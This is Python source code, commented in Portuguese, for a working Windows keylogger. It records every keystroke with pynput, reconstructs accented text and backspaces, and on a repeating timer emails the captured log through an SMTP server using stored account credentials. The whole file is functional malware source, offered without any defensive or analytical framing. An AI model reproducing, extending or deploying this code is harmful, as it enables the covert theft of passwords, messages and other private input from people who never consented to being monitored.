import requests, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener, Controller
from user import usuario, senha
from time import sleep
import threading
import ctypes
import datetime

teclado = Controller()  # Controlador de teclado
letras_sem_formatar = []  # Variável que irá armazenar todas as letras pressionadas
letras_formatadas = []  # Váriavel que irá armazenar as letras formatadas para serem concatenadas antes de enviar


def verificar_capslock():
    if ctypes.windll.user32.GetKeyState(0x14):
        return True
    else:
        return False


def tecla_pressionada(tecla):
    global cronometro_finalizou
    # Executa quando alguma tecla é pressionada
    try:
        # Se o cronômetro finalizar, não irá receber mais teclas até a mensagem ser enviada
        if cronometro_finalizou:
            pass
        else:
            # senão, a tecla vai ser adicionada na lista

            # Formata as teclas que são retornadas pelo pynput
            tecla = str(tecla).replace("'", "")
            tecla = str(tecla).replace("[", "")
            tecla = str(tecla).replace("]", "")

            if verificar_capslock():
                print(f"A tecla pressionada foi {tecla.upper()}")
                letras_sem_formatar.append(tecla.upper())

            else:
                print(f"A tecla pressionada foi {tecla}")
                letras_sem_formatar.append(tecla)

    except AttributeError:
        pass


def tempo_de_envio(n):
    global cronometro_finalizou
    # Quando o cronometro em segundo plano é encerrado, retorna False para o método "on_release" e envia a mensagem
    if cronometro_finalizou:
        return False


def formatar_letras(letras):
    global letras_formatadas, letras_sem_formatar

    # Transforma a letra em String e percorre a mesma "excluindo" com o replace as aspas e os colchetes que são
    # retornados pelo pynput

    try:
        for letra in letras:

            # Usa o captalize para caso use o capslock, mesmo retornando maiúscula, seja formatado para o padrão
            if letra.capitalize() == "Key.esc":
                pass
            elif letra.capitalize() == "Key.space":
                letras_formatadas.append(" ")
            elif letra.capitalize() == "Key.enter":
                letras_formatadas.append("\n")
            elif letra.capitalize() == "Key.tab":
                letras_formatadas.append("    ")
            elif letra.capitalize() == "Key.shift" or letra.capitalize() == "Key.shift_r":
                pass
            elif letra.capitalize() == "Key.caps_lock":
                pass
            elif letra.capitalize() == "Key.ctrl_l" or letra.capitalize() == "Key.ctrl_r":
                pass
            elif letra.capitalize() == "Key.menu":
                pass
            elif letra.capitalize() == "Key.alt_l" or letra.capitalize() == "Key.alt_gr":
                pass
            elif letra.capitalize() == "Key.f1" or letra.capitalize() == "Key.f2" or letra.capitalize() == "Key.f3" or letra.capitalize() == "Key.f4" or letra.capitalize() == "Key.f5" or letra.capitalize() == "Key.f6" or letra.capitalize() == "Key.f7" or letra.capitalize() == "Key.f8" or letra.capitalize() == "Key.f9" or letra.capitalize() == "Key.f10" or letra.capitalize() == "Key.f11" or letra.capitalize() == "Key.f12":
                pass
            elif letra.capitalize() == "Key.cmd":
                pass
            elif letra == "´":
                letras_formatadas.append("´")
            elif letra == "¨":
                letras_formatadas.append("¨")
            elif letra == "`":
                letras_formatadas.append("`")
            elif letra == "^":
                letras_formatadas.append("^")
            elif letra == "~":
                letras_formatadas.append("~")
            elif letra.capitalize() == "Key.print_screen":
                letras_formatadas.append(" (tirou print) ")
            elif letra.capitalize() == "Key.scroll_lock":
                pass
            elif letra.capitalize() == "Key.pause":
                pass
            elif letra.capitalize() == "Key.insert":
                pass
            elif letra.capitalize() == "Key.home":
                pass
            elif letra.capitalize() == "Key.page_up":
                pass
            elif letra.capitalize() == "Key.delete":
                pass
            elif letra.capitalize() == "Key.end":
                pass
            elif letra.capitalize() == "Key.page_down":
                pass
            elif letra == "<96>":
                letras_formatadas.append("0")
            elif letra == "<97>":
                letras_formatadas.append("1")
            elif letra == "<98>":
                letras_formatadas.append("2")
            elif letra == "<99>":
                letras_formatadas.append("3")
            elif letra == "<100>":
                letras_formatadas.append("4")
            elif letra == "<101>":
                letras_formatadas.append("5")
            elif letra == "<102>":
                letras_formatadas.append("6")
            elif letra == "<103>":
                letras_formatadas.append("7")
            elif letra == "<104>":
                letras_formatadas.append("8")
            elif letra == "<105>":
                letras_formatadas.append("9")
            elif letra == "<110>":
                letras_formatadas.append(".")
            elif letra.capitalize() == "Key.left":
                letras_formatadas.append(" (esquerda) ")
            elif letra.capitalize() == "Key.right":
                letras_formatadas.append(" (direita) ")
            elif letra.capitalize() == "Key.up":
                letras_formatadas.append(" (cima) ")
            elif letra.capitalize() == "Key.down":
                letras_formatadas.append(" (baixo) ")
            elif letra.capitalize() == "\\":
                letras_formatadas.append(" (contra-barra)")
            elif letra == "a":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("á")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("à")

                    elif letras_formatadas[-1] == "~":
                        letras_formatadas.pop()
                        letras_formatadas.append("ã")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("â")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("ä")

                    else:
                        letras_formatadas.append("a")
                else:
                    letras_formatadas.append("a")

            elif letra == "A":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("Á")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("À")

                    elif letras_formatadas[-1] == "~":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ã")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("Â")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ä")

                    else:
                        letras_formatadas.append("A")
                else:
                    letras_formatadas.append("A")

            elif letra == "e":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("é")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("è")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("ê")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("ë")

                    else:
                        letras_formatadas.append("e")

                else:
                    letras_formatadas.append("e")

            elif letra == "E":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("É")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("È")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ê")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ë")

                    else:
                        letras_formatadas.append("E")

                else:
                    letras_formatadas.append("E")

            elif letra == "i":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("í")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("ì")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("î")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("ï")

                    else:
                        letras_formatadas.append("i")

                else:
                    letras_formatadas.append("i")

            elif letra == "I":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("Í")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ì")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("Î")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ï")

                    else:
                        letras_formatadas.append("I")

                else:
                    letras_formatadas.append("I")

            elif letra == "o":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("ó")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("ò")

                    elif letras_formatadas[-1] == "~":
                        letras_formatadas.pop()
                        letras_formatadas.append("õ")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("ô")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("ö")

                    else:
                        letras_formatadas.append("o")

                else:
                    letras_formatadas.append("o")

            elif letra == "O":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ó")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ò")

                    elif letras_formatadas[-1] == "~":
                        letras_formatadas.pop()
                        letras_formatadas.append("Õ")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ô")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ö")

                    else:
                        letras_formatadas.append("O")

                else:
                    letras_formatadas.append("O")

            elif letra == "u":
                if len(letras_formatadas) > 0:

                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("ú")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("ù")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("û")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("ü")

                    else:
                        letras_formatadas.append("u")

                else:
                    letras_formatadas.append("u")

            elif letra == "U":
                if len(letras_formatadas) > 0:
                    if letras_formatadas[-1] == "´":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ú")

                    elif letras_formatadas[-1] == "`":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ù")

                    elif letras_formatadas[-1] == "^":
                        letras_formatadas.pop()
                        letras_formatadas.append("Û")

                    elif letras_formatadas[-1] == "¨":
                        letras_formatadas.pop()
                        letras_formatadas.append("Ü")

                    else:
                        letras_formatadas.append("U")

                else:
                    letras_formatadas.append("U")

            elif letra.capitalize() == "Key.backspace":
                # Caso haja algum elemento na lista, o último será apagado ao pressionar backspace
                if len(letras_formatadas) > 0:
                    letras_formatadas.pop()
                # Senão holver, ele vai apenas ignorar
                else:
                    pass

                # Se o elemento estiver não estiver em nenhuma exceção acima, será adicionado na lista
                # "letras_formatadas"
            else:
                letras_formatadas.append(letra)
    except IndexError as erro:
        letras_formatadas = []
        letras_sem_formatar = []
        print(erro)


def juntar_letras(enviar):
    # Junta as mensagem que foram armazendas na lista em uma única String para ser enviada
    enviar = "".join(enviar)
    return enviar


def conexao_internet():
    try:
        # Tentar fazer uma requisição com algum servidor online
        requisicao = requests.get("https://www.google.com")

        if requisicao.status_code == 200:
            # Retorna True se a solicitação estiver OK
            return True
        else:
            # Retorna False se a solicitação NÃO estiver OK
            return False

    except (requests.ConnectionError, requests.exceptions.MissingSchema):
        # Apresentar a mensagem de erro se a conexão falhar
        print("Não foi possível se conectar ao servidor")


def enviar_email():
    global letras_sem_formatar, letras_formatadas, tempo_total, cronometro_finalizou, mensagem_final

    # Configurando horário
    data_atual = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")

    # Credenciais de login
    USUARIO = usuario
    SENHA = senha

    # Remetente e Destinatário
    REMETENTE = USUARIO
    DESTINATARIO = USUARIO

    # Mensagem para enviar
    assunto_mensagem = f"Log: {data_atual}"
    mensagem = mensagem_final

    # Configurando servidor smtp
    servidor_smtp = "smtp.servidor.com"
    porta_smtp = 587  # A porta padrão da Lib também funciona, que é a 25, mas a 587 é mais comumente usada

    try:
        # Cria uma conexão com o servidor
        estabelecer_conexao = smtplib.SMTP(servidor_smtp, porta_smtp)

        # startttls() é um método opcional dependendendo do servidor, nem todos exigem (gmail.com exige, por exemplo)
        estabelecer_conexao.starttls()

        # Fazendo login na conta
        estabelecer_conexao.login(USUARIO, SENHA)

        # Criando mensagem para enviar
        msg = MIMEMultipart()
        msg["From"] = REMETENTE
        msg["To"] = DESTINATARIO
        msg["Subject"] = assunto_mensagem

        # Adicionando corpo do texto
        msg.attach(MIMEText(mensagem, 'plain'))

        # Enviando o e-mail
        estabelecer_conexao.sendmail(REMETENTE, DESTINATARIO, msg.as_string())
        print("Mensagem enviada")

        # Apaga os caracteres salvos na lista
        letras_sem_formatar = []
        letras_formatadas = []

        # Inicia novamente o cronometro
        cronometro_finalizou = False
        tempo_total = threading.Thread(target=cronometro)
        tempo_total.start()

        # Se a mensagem for realmente enviada, retorna True, para sair do loop
        return True

    except Exception as erro:
        # Exibe um erro caso a mensagem não seja enviada (normalmente por spam)
        print(f"Ocorreu um erro de envio {erro}")


def cronometro():
    global cronometro_finalizou
    # Cronômetro inicia em segundo plano, enquanto captura as teclas
    # Caso queria mudar alterar o valor do temporizador e do range do loop
    temporizador = 5
    for t in range(5):
        temporizador -= 1
        sleep(1)

    print("Tempo acabou")
    cronometro_finalizou = True

    # Tecla qualquer sendo liberada pelo próprio programa para retornar False para o método "on_release"
    teclado.release(Key.esc)


# Iniciando o cronômetro em outra Thread (segundo plano)
cronometro_finalizou = False
threading.Thread(target=cronometro).start()

verificar_teclas = Listener  # váriavel instanciada (objeto) da classe Listerner
while True:
    # "Abre" a classe para receber duas funções como argumento para os atributos "on_press" e "on_release" chamando esse
    # procedimento de "verificar"
    with verificar_teclas(on_press=tecla_pressionada, on_release=tempo_de_envio) as verificar:
        # Inicia o o procedimento "verificar" a partir da função join() do pynput
        verificar.join()

    # Formata as letras que são capturadas
    formatar_letras(letras_sem_formatar)

    # atribui à variável mensagem_final as letras formatadas que foram encaminhdas para a função juntar_letras()
    mensagem_final = juntar_letras(letras_formatadas)

    # Verifica se o tamanho da mensagem é maior ou igual a 1 caracter e se a conexão da internet está ok
    if len(mensagem_final) >= 1 and conexao_internet():

        # Se tudo estiver ok, entra no loop para enviar o e-mail. O loop serve para garantir que a mensagem seja enviada
        # Ou seja, se der algum erro de spam (por exemplo), ele tenta enviar a mensagem de novo.
        while True:
            if enviar_email():
                break
            enviar_email()

    else:
        # Se não estiver ok, ele reinicia o cronômetro e começa a capturar as teclas novamente
        # Ele não apaga as teclas que foram capturadas, caso caia no "else"
        cronometro_finalizou = False
        tempo_total = threading.Thread(target=cronometro)
        tempo_total.start()
